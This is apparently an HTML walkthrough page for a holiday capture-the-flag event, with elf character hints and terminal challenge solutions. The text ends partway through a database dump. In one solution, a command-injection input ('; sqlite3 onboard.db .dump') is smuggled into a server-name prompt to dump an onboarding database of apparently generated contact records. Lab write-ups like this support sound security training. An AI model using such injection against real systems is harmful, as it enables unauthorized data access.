              <a class="dropdown-item" href="#obj2">Objective 2</a>
              <a class="dropdown-item" href="#termPwshmenu">The Name Game</a>
            </div>
          </div>
          <img src="images/elf-minty-candycane.png">
        </div>
        <div class="col-9">
          <blockquote class="blockquote border rounded p-2">
            <p class="mb-2">Can you help me? I'm in a bit of a fix.</p>
            <p class="mb-2">I need to make a nametag for an employee, but I can't remember his first name.</p>
            <p class="mb-2">Maybe you can figure it out using this Cranberry Pi terminal?</p>
            <p class="mb-2">The Santa's Castle Onboarding System? I think it's written in PowerShell, if I'm not mistaken.</p>
            <p class="mb-2">PowerShell itself can be tricky when handling user input. Special characters such as & and ; can be used to inject commands.</p>
            <p class="mb-2">I think that system is one of Alabaster's creations.</p>
            <p class="mb-2">He's a little ... obsessed with SQLite database storage.</p>
            <p class="mb-2">I don't know much about SQLite, just the .dump command.</p>
            <footer class="blockquote-footer text-right">Minty Candycane before solving <a href="#termPwshmenu"><b>The Name Game</b></a></footer>
          </blockquote>
          <blockquote class="blockquote border rounded p-2">
            <p class="mb-2">Thank you so much for your help! I've gotten Mr. Chan his name tag. I'd love to repay the favor.</p>
            <p class="mb-2">Have you ever visited a website and seen a listing of files - like you're browsing a directory? Sometimes this is enabled on web servers.</p>
            <p class="mb-2">This is generally unwanted behavior. You can find sleighloads of examples by searching the web for index.of.</p>
            <p class="mb-2">On a website, it's sometimes as simple as removing characters from the end of a URL.</p>
            <p class="mb-2">What a silly misconfiguration for leaking information!</p>
            <footer class="blockquote-footer text-right">Minty Candycane after solving <a href="#termPwshmenu"><b>The Name Game</b></a></footer>
          </blockquote>
        </div>
      </div>

      <div class="row border rounded p-2 m-2">
        <div class="col-3">
          <div class="dropdown">
            <button class="btn btn-info dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
              <a id="npcTangle"></a>Tangle Coalbox
            </button>
            <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
              <a class="dropdown-item" href="#hntTangle">Tangle Coalbox Hints</a>
              <a class="dropdown-item" href="#obj3">Objective 3</a>
              <a class="dropdown-item" href="#termViminfo">Lethal ForensicELFication</a>
            </div>
          </div>
          <img src="images/elf-tangle-coalbox.png">
        </div>
        <div class="col-9">
          <blockquote class="blockquote border rounded p-2">
            <p class="mb-2">Any chance you can help me with an investigation?</p>
            <p class="mb-2">Elf Resources assigned me to look into a case, but it seems to require digital forensic skills.</p>
            <p class="mb-2">Do you know anything about Linux terminal editors and digital traces they leave behind?</p>
            <p class="mb-2">Apparently editors can leave traces of data behind, but where and how escapes me!</p>
            <footer class="blockquote-footer text-right">Tangle Coalbox before solving <a href="#termViminfo"><b>Lethal ForensicELFication</b></a></footer>
          </blockquote>
          <blockquote class="blockquote border rounded p-2">
            <p class="mb-2">Hey, thanks for the help with the investigation, gumshoe.</p>
            <p class="mb-2">Have you been able to solve the lock with the funny shapes?</p>
            <p class="mb-2">It reminds me of something called "de Bruijn Sequences."</p>
            <p class="mb-2">You can optimize the guesses because there is no start and stop -- each new value is added to the end and the first is removed.</p>
            <p class="mb-2">I've even seen de Bruijn sequence generators online.</p>
            <p class="mb-2">Here the length of the alphabet is 4 (only 4 buttons) and the length of the PIN is 4 as well.</p>
            <p class="mb-2">Mathematically this is k=4, n=4 to generate the de Bruijn sequence.</p>
            <p class="mb-2">Math is like your notepad and pencil - can't leave home without it!</p>
            <p class="mb-2">I heard Alabaster lost his badge! That's pretty bad. What do you think someone could do with that?</p>
            <footer class="blockquote-footer text-right">Tangle Coalbox after solving <a href="#termViminfo"><b>Lethal ForensicELFication</b></a></footer>
          </blockquote>
        </div>
      </div>

      <div class="row border rounded p-2 m-2">
        <div class="col-3">
          <div class="dropdown">
            <button class="btn btn-info dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
              <a id="npcWunorse"></a>Wunorse Openslae
            </button>
            <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
              <a class="dropdown-item" href="#hntWunorse">Wunorse Openslae Hints</a>
              <a class="dropdown-item" href="#obj4">Objective 4</a>
              <a class="dropdown-item" href="#termPlaintextCreds">Stall Mucking Report</a>
            </div>
          </div>
          <img src="images/elf-wunorse-openslae.png">
        </div>
        <div class="col-9">
          <blockquote class="blockquote border rounded p-2">
            <p class="mb-2">Hi, I'm Wunorse Openslae</p>
            <p class="mb-2">What was that password?</p>
            <p class="mb-2">Golly, passwords may be the end of all of us. Good guys can't remember them, and bad guess can guess them!</p>
            <p class="mb-2">I've got to upload my chore report to my manager's inbox, but I can't remember my password.</p>
            <p class="mb-2">Still, with all the automated tasks we use, I'll bet there's a way to find it in memory...</p>
            <footer class="blockquote-footer text-right">Wunorse Openslae before solving <a href="#termPlaintextCreds"><b>Stall Mucking Report</b></a></footer>
          </blockquote>
          <blockquote class="blockquote border rounded p-2">
            <p class="mb-2">Thank goodness for command line passwords - and thanks for your help!</p>
            <p class="mb-2">Speaking of good ways to find credentials, have you heard of Trufflehog?</p>
            <p class="mb-2">It's a cool way to dig through repositories for passwords, RSA keys, and more.</p>
            <p class="mb-2">I mean, no one EVER uploads sensitive credentials to public repositories, right? But if they did, this would be a great tool for finding them.</p>
            <p class="mb-2">But hey, listen to me ramble. If you're interested in Trufflehog, you should check out Brian Hostetler's talk!</p>
            <p class="mb-2">Have you tried the entropy=True option when running Trufflehog? It is amazing how much deeper it will dig!</p>
            <p class="mb-2">Oh my! Santa’s castle… it’s under siege!</p>
            <p class="mb-2">We’re trapped inside and can’t leave.</p>
            <p class="mb-2">The toy soldiers are blocking all of the exits!</p>
            <p class="mb-2">We are all prisoners!</p>
            <footer class="blockquote-footer text-right">Wunorse Openslae after solving <a href="#termPlaintextCreds"><b>Stall Mucking Report</b></a></footer>
          </blockquote>
        </div>
      </div>

      <div class="row border rounded p-2 m-2">
        <div class="col-3">
          <div class="dropdown">
            <button class="btn btn-info dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
              <a id="npcHolly"></a>Holly Evergreen
            </button>
            <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
              <a class="dropdown-item" href="#hntHolly">Holly Evergreen Hints</a>
              <a class="dropdown-item" href="#obj5">Objective 5</a>
              <a class="dropdown-item" href="#termHTTP2">CURLing Master</a>
            </div>
          </div>
          <img src="images/elf-holly-evergreen.png">
        </div>
        <div class="col-9">
          <blockquote class="blockquote border rounded p-2">
            <p class="mb-2">Oh that Bushy!</p>
            <p class="mb-2">Sorry to vent, but that brother of mine did something strange.</p>
            <p class="mb-2">The trigger to restart the Candy Striper is apparently an arcane HTTP call or 2.</p>
            <p class="mb-2">I sometimes wonder if all IT folk do strange things with their home networks...</p>
            <footer class="blockquote-footer text-right">Holly Evergreen before solving <a href="#termHTTP2"><b>CURLing Master</b></a></footer>
          </blockquote>
          <blockquote class="blockquote border rounded p-2">
            <p class="mb-2">Unencrypted HTTP/2? What was he thinking? Oh well.</p>
            <p class="mb-2">Have you ever used Bloodhound for testing Active Directory implementations?</p>
            <p class="mb-2">It's a merry little tool that can sniff AD and find paths to reaching privileged status on specific machines.</p>
            <p class="mb-2">AD implementations can get so complicated that administrators may not even know what paths they've set up that attackers might exploit.</p>
            <p class="mb-2">Have you seen anyone demo the tool before?</p>
            <footer class="blockquote-footer text-right">Holly Evergreen after solving <a href="#termHTTP2"><b>CURLing Master</b></a></footer>
          </blockquote>
        </div>
      </div>

      <div class="row border rounded p-2 m-2">
        <div class="col-3">
          <div class="dropdown">
            <button class="btn btn-info dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
              <a id="npcPepper"></a>Pepper Minstix
            </button>
            <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
              <a class="dropdown-item" href="#hntPepper">Pepper Minstix Hints</a>
              <a class="dropdown-item" href="#obj6">Objective 6</a>
              <a class="dropdown-item" href="#termSprayDetect">Yule Log Analysis</a>
              <a class="dropdown-item" href="#obj6">Scan-O-Matic</a>
            </div>
          </div>
          <img src="images/elf-pepper-minstix.png">
        </div>
        <div class="col-9">
          <blockquote class="blockquote border rounded p-2">
            <p class="mb-2">Have you heard of password spraying? It seems we've been victim.</p>
            <p class="mb-2">We fear that they were successful in accessing one of our Elf Web Access accounts, but we don't know which one.</p>
            <p class="mb-2">Parsing through .evtx files can be tricky, but there's a Python script that can help you convert it into XML for easier grep'ing.</p>
            <footer class="blockquote-footer text-right">Pepper Minstix before solving <a href="#termSprayDetect"><b>Yule Log Analysis</b></a></footer>
          </blockquote>
          <blockquote class="blockquote border rounded p-2">
            <p class="mb-2">Well, that explains the odd activity in Minty's account. Thanks for your help!</p>
            <p class="mb-2">All of the Kringle Castle employees have these cool cards with QR codes on them that give us access to restricted areas.</p>
            <p class="mb-2">Unfortunately, the badge-scan-o-matic said my account was disabled when I tried scanning my badge.</p>
            <p class="mb-2">I really needed access so I tried scanning several QR codes I made from my phone but the scanner kept saying "User Not Found".</p>
            <p class="mb-2">I researched a SQL database error from scanning a QR code with special characters in it and found it may contain an injection vulnerability.</p>
            <p class="mb-2">I was going to try some variations I found on <a href="https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF#Auth_Bypass">OWASP</a> but decided to stop so I don't tick-off Alabaster.</p>
            <footer class="blockquote-footer text-right">Pepper Minstix after solving <a href="#termSprayDetect"><b>Yule Log Analysis</b></a></footer>
          </blockquote>
        </div>
      </div>

      <div class="row border rounded p-2 m-2">
        <div class="col-3">
          <div class="dropdown">
            <button class="btn btn-info dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
              <a id="npcSparkle"></a>Sparkle Redberry
            </button>
            <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
              <a class="dropdown-item" href="#hntSparkle">Sparkle Redberry Hints</a>
              <a class="dropdown-item" href="#obj7">Objective 7</a>
              <a class="dropdown-item" href="#termGitpasshist">Dev Ops Fail</a>
            </div>
          </div>
          <img src="images/elf-sparkle-redberry.png">
        </div>
        <div class="col-9">
          <blockquote class="blockquote border rounded p-2">
            <p class="mb-2">Ugh, can you believe that Elf Resources is poking around? Something about sensitive info in my git repo.</p>
            <p class="mb-2">I mean, I may have uploaded something sensitive earlier, but it's no big deal. I overwrote it!</p>
            <p class="mb-2">Care to check my Cranberry Pi terminal and prove me right?</p>
            <footer class="blockquote-footer text-right">Sparkle Redberry before solving <a href="#termGitpasshist"><b>Dev Ops Fail</b></a></footer>
          </blockquote>
          <blockquote class="blockquote border rounded p-2">
            <p class="mb-2">Oh my golly gracious - Tangle was right? It was still in there? How embarrassing!</p>
            <p class="mb-2">Well, if I can try to redeem myself a bit, let me tell you about another challenge you can help us with.</p>
            <p class="mb-2">I wonder if Tangle Coalbox has taken a good look at his own employee import system.</p>
            <p class="mb-2">It takes CSV files as imports. That certainly can expedite a process, but there's danger to be had.</p>
            <p class="mb-2">I'll bet, with the right malicious input, some naughty actor could exploit a vulnerability there.</p>
            <p class="mb-2">I'm sure the danger can be mitigated. OWASP has guidance on what not to allow with such oploads.</p>
            <footer class="blockquote-footer text-right">Sparkle Redberry after solving <a href="#termGitpasshist"><b>Dev Ops Fail</b></a></footer>
          </blockquote>
        </div>
      </div>

      <div class="row border rounded p-2 m-2">
        <div class="col-3">
          <div class="dropdown">
            <button class="btn btn-info dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
              <a id="npcSugar"></a>SugarPlum Mary
            </button>
            <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
              <a class="dropdown-item" href="#hntSugar">SugarPlum Mary Hints</a>
              <a class="dropdown-item" href="#obj8">Objective 8</a>
              <a class="dropdown-item" href="#termPythonDockerChallenge">Python Escape from LA</a>
            </div>
          </div>
          <img src="images/elf-sugarplum-mary.png">
        </div>
        <div class="col-9">
          <blockquote class="blockquote border rounded p-2">
            <p class="mb-2">I'm glad you're here; my terminal is trapped inside a python! Or maybe my python is trapped inside a terminal?
            Can you please help me by escaping from the Python interpreter?</p>
            <footer class="blockquote-footer text-right">SugarPlum Mary before solving <a href="#termPythonDockerChallenge"><b>Python Escape from LA</b></a></footer>
          </blockquote>
          <blockquote class="blockquote border rounded p-2">
            <p class="mb-2">Yay, you did it! You escaped from the Python!</p>
            <p class="mb-2">As a token of my gratitude, I would like to share a rumor I had heard about Santa's new web-based packet analyzer - Packalyzer.</p>
            <p class="mb-2">Another elf told me that <a href="https://packalyzer.kringlecastle.com/">Packalyzer</a> was rushed and deployed with development code sitting in the web root.</p>
            <p class="mb-2">Apparently, he found this out by looking at HTML comments left behind and was able to grab the server-side source code.</p>
            <p class="mb-2">There was suspicious-looking development code using environment variables to store SSL keys and open up directories.</p>
            <p class="mb-2">This elf then told me that manipulating values in the URL gave back weird and descriptive errors.</p>
            <p class="mb-2">I'm hoping these errors can't be used to compromise SSL on the website and steal logins.</p>
            <p class="mb-2">On a tooootally unrelated note, have you seen the HTTP2 talk at at KringleCon by the Chrises? I never knew HTTP2 was so different!</p>
            <footer class="blockquote-footer text-right">SugarPlum Mary after solving <a href="#termPythonDockerChallenge"><b>Python Escape from LA</b></a></footer>
          </blockquote>
        </div>
      </div>

      <div class="row border rounded p-2 m-2">
        <div class="col-3">
          <div class="dropdown">
            <button class="btn btn-info dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
              <a id="npcShinny"></a>Shinny Upatree
            </button>
            <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
              <a class="dropdown-item" href="#hntShinny">Shinny Upatree Hints</a>
              <a class="dropdown-item" href="#obj91">Objective 9.1</a>
              <a class="dropdown-item" href="#termUnlinkedFunction">Sleigh Bell Lottery</a>
            </div>
          </div>
          <img src="images/elf-shinny-upatree.png">
        </div>
        <div class="col-9">
          <blockquote class="blockquote border rounded p-2">
            <p class="mb-2">Hey! Mind giving ole' Shinny Upatree some help? There's a contest I HAVE to win.</p>
            <p class="mb-2">As long as no one else wins first, I can just keep trying to win the Sleigh Bell Lotto, but this could take forever!</p>
            <p class="mb-2">I'll bet the GNU Debugger can help us. With the PEDA modules installed, it can be prettier. I mean easier.</p>
            <footer class="blockquote-footer text-right">Shinny Upatree before solving <a href="#termUnlinkedFunction"><b>Sleigh Bell Lottery</b></a></footer>
          </blockquote>
          <blockquote class="blockquote border rounded p-2">
            <p class="mb-2">Sweet candy goodness - I win! Thank you so much!</p>
            <p class="mb-2">Have you heard that Kringle Castle was hit by a new ransomware called Wannacookie?</p>
            <p class="mb-2">Several elves reported receiving a cookie recipe Word doc. When opened, a PowerShell screen flashed by and their files were encrypted.</p>
            <p class="mb-2">Many elves were affected, so Alabaster went to go see if he could help out.</p>
            <p class="mb-2">I hope Alabaster watched the <a href="http://www.youtube.com/watch?v=wd12XRq2DNk">PowerShell Malware talk at KringleCon</a> before he tried analyzing Wannacookie on his computer.</p>
            <p class="mb-2">An elf I follow online said he analyzed Wannacookie and that it communicates over DNS.</p>
            <p class="mb-2">He also said that Wannacookie transfers files over DNS and that it looks like it grabs a public key this way.</p>
            <p class="mb-2">Another recent ransomware made it possible to retrieve crypto keys from memory. Hopefully the same is true for Wannacookie!</p>
            <p class="mb-2">Of course, this all depends how the key was encrypted and managed in memory. Proper public key encryption requires a private key to decrypt.</p>
            <p class="mb-2">Perhaps there is a flaw in the wannacookie author's DNS server that we can manipulate to retrieve what we need.</p>
            <p class="mb-2">If so, we can retrieve our keys from memory, decrypt the key, and then decrypt our ransomed files.</p>
            <footer class="blockquote-footer text-right">Shinny Upatree after solving <a href="#termUnlinkedFunction"><b>Sleigh Bell Lottery</b></a></footer>
          </blockquote>
        </div>
      </div>

      <div class="row border rounded p-2 m-2">
        <div class="col-3">
          <div class="dropdown">
            <button class="btn btn-info dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
              <a id="npcAlabaster"></a>Alabaster Snowball
            </button>
            <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
              <a class="dropdown-item" href="#hntAlabaster">Alabaster Snowball hints</a>
              <a class="dropdown-item" href="#obj92">Objective 9.2</a>
              <a class="dropdown-item" href="#obj93">Objective 9.3</a>
              <a class="dropdown-item" href="#obj94">Objective 9.4</a>
              <a class="dropdown-item" href="#obj10">Objective 10</a>
              <a class="dropdown-item" href="#obj91">Snort Challenge</a>
              <a class="dropdown-item" href="#obj93">HoHoHo Daddy</a>
              <a class="dropdown-item" href="#objx">Piano Lock</a>
            </div>
          </div>
          <img src="images/elf-alabaster-snowball.png">
        </div>
        <div class="col-9">
          <blockquote class="blockquote border rounded p-2">
            <p class="mb-2">I came here to help but got locked in 'cause I dropped my "Alabaster Snowball" badge in a rush.</p>
            <p class="mb-2">Help, all of our computers have been encrypted by ransomware!</p>
            <footer class="blockquote-footer text-right">Alabaster Snowball after solving <a href="#obj6"><b>Scan-O-Matic</b></a></footer>
          </blockquote>
          <blockquote class="blockquote border rounded p-2">
            <p class="mb-2">Thank you so much! Snort IDS is alerting on each new ransomware infection in our network.</p>
            <p class="mb-2">Hey, you're pretty good at this security stuff. Could you help me further with what I suspect is a malicious Word document?</p>
            <p class="mb-2">All the elves were emailed a cookie recipe right before all the infections. Take this <a href="#artDocument">document</a> with a password of <b>elves</b> and find the domain it communicates with.</p>
            <footer class="blockquote-footer text-right">Alabaster Snowball after solving <a href="#obj91"><b>Snort Challenge</b></a></footer>
          </blockquote>
          <blockquote class="blockquote border rounded p-2">
            <p class="mb-2">On a website, it's sometimes as simple as removing characters from the end of a URL.</p>
            <p class="mb-2">What a silly misconfiguration for leaking information!</p>
            <footer class="blockquote-footer text-right">Alabaster Snowball after solving <a href="#termPwshmenu"><b>The Name Game</b></a></footer>
          </blockquote>
          <blockquote class="blockquote border rounded p-2">
            <p class="mb-2">Yippee-Ki-Yay! Now, I have a ma... kill-switch!</p>
            <p class="mb-2">Now that we don't have to worry about new infections, I could sure use your L337 security skills for one last thing.</p>
            <p class="mb-2">As I mentioned, I made the mistake of analyzing the malware on my host computer and the ransomware encrypted my password database.</p>
            <p class="mb-2">Take this zip with a memory dump and my encrypted password database, and see if you can recover my passwords.</p>
            <p class="mb-2">One of the passwords will unlock our access to the vault so we can get in before the hackers.</p>
            <footer class="blockquote-footer text-right">Alabaster Snowball after solving <a href="#obj93"><b>HoHoHo Daddy</b></a></footer>
          </blockquote>
          <blockquote class="blockquote border rounded p-2" data-toggle="tooltip" title="Actually, it's Mozart">
            <p class="mb-2">I'm seriously impressed by your security skills!</p>
            <p class="mb-2">How could I forget that I used <a href="#trivPianoLock">Rachmaninoff</a> as my musical password?</p>
            <p class="mb-2">Of course I transposed it it before I entered it into my database for extra security.</p>
            <footer class="blockquote-footer text-right">Alabaster Snowball after solving <a href="#objx"><b>Piano Lock</b></a></footer>
          </blockquote>
        </div>
      </div>
    </div>

    <div class="container m-4 p-4">
      <h1>Terminals</h1>

      <div class="border rounded p-2 m-2">
        <div class="dropdown">
          <button class="btn btn-dark dropdown-toggle mb-1" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            <a id="termViescape"></a>Essential Editor Skills
          </button>
          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
            <a class="dropdown-item" href="#hntBushy">Bushy Evergreen Hints</a>
            <a class="dropdown-item" href="#npcBushy">Bushy Evergreen</a>
            <a class="dropdown-item" href="#obj1">Objective 1</a>
          </div>
        </div>
        <div id="divViescape" style="display: inline-block" onclick='if (!$(this).html().includes("iframe")) {$(this).html(atob("PGlmcmFtZSBzdHlsZT0ibWluLXdpZHRoOiA4MDBweDsgbWF4LXdpZHRoOiAxMDAwcHg7IGhlaWdodDogODAwcHg7IGJvcmRlcjogbm9uZTsiIHNyYz0iaHR0cHM6Ly9kb2NrZXIua3JpbmdsZWNvbi5jb20vP2NoYWxsZW5nZT12aWVzY2FwZSI+PC9pZnJhbWU+PHA+PGEgaHJlZj0iIyEiIGNsYXNzPSJidG4gYnRuLWluZm8iICBvbm1vdXNldXA9IiQoJyNkaXZWaWVzY2FwZScpLmh0bWwoYXRvYignUEdFZ2FISmxaajBpSXlFaUlHTnNZWE56UFNKaWRHNGdZblJ1TFdsdVptOGlQa05zYVdOcklHaGxjbVVnZEc4Z1BHSStiM0JsYmp3dllqNGdSWE56Wlc1MGFXRnNJRVZrYVhSdmNpQlRhMmxzYkhNZ1ZHVnliV2x1WVd3OEwyRSsnKSkiPkNsaWNrIGhlcmUgdG8gPGI+Y2xvc2U8L2I+IEVzc2VudGlhbCBFZGl0b3IgU2tpbGxzIFRlcm1pbmFsPC9hPjwvcD4="))}'>
          <a href="#!" class="btn btn-info">Click here to <b>open</b> Essential Editor Skills Terminal</a>
        </div>

        <hr class="my-4">
        <p>For this terminal challenge you are immediately dropped into a vi editor session. Your objective is to get out.</p>

<pre class="border text-light bg-dark p-2">
                  ........................................
               .;oooooooooooool;,,,,,,,,:loooooooooooooll:
             .:oooooooooooooc;,,,,,,,,:ooooooooooooollooo:
           .';;;;;;;;;;;;;;,''''''''';;;;;;;;;;;;;,;ooooo:
         .''''''''''''''''''''''''''''''''''''''''';ooooo:
       ;oooooooooooool;''''''',:loooooooooooolc;',,;ooooo:
    .:oooooooooooooc;',,,,,,,:ooooooooooooolccoc,,,;ooooo:
  .cooooooooooooo:,''''''',:ooooooooooooolcloooc,,,;ooooo,
  coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,,;ooo,
  coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,,;l'
  coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,..
  coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc.
  coooooooooooooo,,,,,,,,,;ooooooooooooooloooo:.
  coooooooooooooo,,,,,,,,,;ooooooooooooooloo;
  :llllllllllllll,'''''''';llllllllllllllc,



I'm in quite a fix, I need a quick escape.
Pepper is quite pleased, while I watch here, agape.
Her editor's confusing, though "best" she says - she yells!
My lesson one and your role

<span style="color: rgb(114, 159, 207); font-weight: bold;">~                                                                                           </span>
                                                                          13,36         All</pre>

        <p><a href="#npcBushy">Bushy Evergreen</a> provides you with a single hint, <a href="https://kb.iu.edu/d/afcz">Indiana University VI Tutorials</a>. The Instructions are pretty straight forward. </p>
        <ul>
          <li>If you are currently in insert or append mode, press <kbd>Esc</kbd>.</li>
          <li>Press <kbd data-toggle="tooltip" data-placement="top" title="This puts you into colon mode to be able to specify commands">:</kbd> (colon). The cursor should reappear at the lower left corner of the screen beside a colon prompt.</li>
          <li>Enter the following: <kbd data-toggle="tooltip" data-placement="top" title="This means to abort all changes and exit">q!</kbd></li>
        </ul>
        <p>Some other colon commands to exit include:</p>
        <ul>
          <li><kbd>:wq!</kbd></li>
          <li><kbd>:quit!</kbd></li>
        </ul>
        <p>Not including the <kbd>!</kbd> will simply prompt you to accept any changes to the document if any were made.</p>
        <p>When you first enter this challenge you are already in movement mode so there is no need to press <kbd>Esc</kbd> first.</p>
        <p>Once you have exited the vi session a program <code>/usr/local/bin/sucessfulescape</code> is executed indicating your completion of the challenge with the final message:</p>
        <pre class="text-monospace bg-dark text-light p-2">You did it! Congratulations!</pre>
      </div>
      <div class="border rounded p-2 m-2">
        <div class="dropdown">
          <button class="btn btn-dark dropdown-toggle mb-1" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            <a id="termPwshmenu"></a>The Name Game
          </button>
          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
            <a class="dropdown-item" href="#hntMinty">Minty Candycane Hints</a>
            <a class="dropdown-item" href="#npcMinty">Minty Candycane</a>
            <a class="dropdown-item" href="#obj2">Objective 2</a>
            <a class="dropdown-item" href="#artMenuPS1">menu.ps1 from The Name Game terminal</a>
          </div>
        </div>
        <div id="divPwshmenu" style="display: inline-block" onclick='if (!$(this).html().includes("iframe")) {$(this).html(atob("PGlmcmFtZSBzdHlsZT0ibWluLXdpZHRoOiA4MDBweDsgbWF4LXdpZHRoOiAxMDAwcHg7IGhlaWdodDogODAwcHg7IGJvcmRlcjogbm9uZTsiIHNyYz0iaHR0cHM6Ly9kb2NrZXIua3JpbmdsZWNvbi5jb20vP2NoYWxsZW5nZT1wd3NobWVudSI+PC9pZnJhbWU+PHA+PGEgaHJlZj0iIyEiIGNsYXNzPSJidG4gYnRuLWluZm8iICBvbm1vdXNldXA9IiQoJyNkaXZQd3NobWVudScpLmh0bWwoYXRvYignUEdFZ2FISmxaajBpSXlFaUlHTnNZWE56UFNKaWRHNGdZblJ1TFdsdVptOGlQa05zYVdOcklHaGxjbVVnZEc4Z1BHSStiM0JsYmp3dllqNGdWR2hsSUU1aGJXVWdSMkZ0WlNCVVpYSnRhVzVoYkR3dllUND0nKSkiPkNsaWNrIGhlcmUgdG8gPGI+Y2xvc2U8L2I+IFRoZSBOYW1lIEdhbWUgVGVybWluYWw8L2E+PC9wPg=="))}'>
          <a href="#!" class="btn btn-info">Click here to <b>open</b> The Name Game Terminal</a>
        </div>

        <hr class="my-4">
        <p>According to <a href="#npcMinty">Minty Candycane</a>, she needs the first name of an employee that can only be found in the Cranberry Pi terminal, <b>The Name Game</b>. Two other clues indicate the onboarding system uses Powershell and that a SQLite database may be involved.</p>
        <p>Opening <b>The Name Game</b> terminal challenge you are presented with a menu with 3 options.</p>
        <ul>
          <li> Press  1 to start the onboard process.</li>
          <li> Press  2 to verify the system.</li>
          <li> Press  q to quit.</li>
        </ul>
        <p>The <kbd>q</kbd> option simply quits the program and does nothing else.</p>
        <p>The <kbd>1</kbd> option brings you to a menu to enter some employee information afterwhich a message saying</p>
        <samp>Save to sqlite DB using command line</samp>
        </p>is shown. You can then return to the main menu.</p>
        <p>The <kbd>2</kbd> option brings you a validation routine asking for a servername. Once you enter a server "e.g. 127.0.0.1" the system appears to try to ping that adddress. This is then followed by a curious line:</p>
        <pre class="text-monospace bg-dark text-light p-2">onboard.db: SQLite 3.x database</pre>
        <p><a href="#npcMinty">Minty Candycane</a> specifically says "Special characters such as & and ; can be used to inject commands." So lets try that. If we try option <kbd>2</kbd> with our knowledge of the filename <code>onboard.db</code> we craft the following input:</p>
        <pre class="text-monospace bg-dark text-light p-2">; sqlite3 onboard.db .dump</pre>
        <p>Doing so results in the following output:</p>
<pre class="border text-light bg-dark p-2">
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE onboard (
    id INTEGER PRIMARY KEY,
    fname TEXT NOT NULL,
    lname TEXT NOT NULL,
    street1 TEXT,
    street2 TEXT,
    city TEXT,
    postalcode TEXT,
    phone TEXT,
    email TEXT
);
INSERT INTO "onboard" VALUES(10,'Karen','Duck','52 Annfield Rd',NULL,'BEAL','DN14 7AU','077 8656 6609','karensduck@einrot.com');
INSERT INTO "onboard" VALUES(11,'Josephine','Harrell','3 Victoria Road',NULL,'LITTLE ASTON','B74 8XD','079 5532 7917','josephinedharrell@einrot.com');
INSERT INTO "onboard" VALUES(12,'Jason','Madsen','4931 Cliffside Drive',NULL,'Worcester','12197','607-397-0037','jasonlmadsen@einrot.com');
INSERT INTO "onboard" VALUES(13,'Nichole','Murphy','53 St. John Street',NULL,'Craik','S4P 3Y2','306-734-9091','nicholenmurphy@teleworm.us');
INSERT INTO "onboard" VALUES(14,'Mary','Lyons','569 York Mills Rd',NULL,'Toronto','M3B 1Y2','416-274-6639','maryjlyons@superrito.com');
INSERT INTO "onboard" VALUES(15,'Luz','West','1307 Poe Lane',NULL,'Paola','66071','913-557-2372','luzcwest@rhyta.com');
INSERT INTO "onboard" VALUES(16,'Walter','Savell','4782 Neville Street',NULL,'Seymour','47274','812-580-5138','walterdsavell@fleckens.hu');
INSERT INTO "onboard" VALUES(17,'Michelle','Hicks','82 Middlewich Road',NULL,'FIRTH','ZE2 1BQ','070 2607 0997','michellejhicks@jourrapide.com');
INSERT INTO "onboard" VALUES(18,'Carolyn','Harvey','94 Friar Street',NULL,'CLEETHORPES','DN35 7YP','078 3359 6177','carolynmharvey@teleworm.us');
INSERT INTO "onboard" VALUES(19,'Julie','Westrick','4261 Corpening Drive',NULL,'Troy','48083','248-457-6093','julieswestrick@jourrapide.com');
INSERT INTO "onboard" VALUES(20,'Cara','Hodge','6 Clasper Way',NULL,'HEYSHOTT','GU29 3ZX','079 8870 5836','cararhodge@armyspy.com');
INSERT INTO "onboard" VALUES(21,'Ashley','Ramos','2326 Lauzon Parkway',NULL,'Leamington','N8H 3B9','519-329-7102','ashleywramos@superrito.com');
INSERT INTO "onboard" VALUES(22,'Marcia','Yee','17 Holburn Lane',NULL,'HELPERBY','YO6 2FT','070 2717 2611','marciamyee@armyspy.com');
INSERT INTO "onboard" VALUES(23,'Erica','McIntosh','4894 Port Washington Road',NULL,'Leslieville','T0M 1H0','403-729-0320','ericaamcintosh@cuvox.de');
INSERT INTO "onboard" VALUES(24,'Franklyn','Goldsmith','25 Hillside Street',NULL,'Paradise Valley','85253','480-513-4464','franklynngoldsmith@teleworm.us');
INSERT INTO "onboard" VALUES(25,'Christopher','Green','4896 Lynden Road',NULL,'Moonstone','L0K 1N0','705-835-6976','christopherngreen@fleckens.hu');
INSERT INTO "onboard" VALUES(26,'Reggie','Little','285 Kidd Avenue',NULL,'Anchorage','99501','907-932-8909','reggiehlittle@gustr.com');
INSERT INTO "onboard" VALUES(27,'Mary','Hawes','91 George Avenue',NULL,'Belle Fontaine','36607','251-245-0433','maryrhawes@gustr.com');
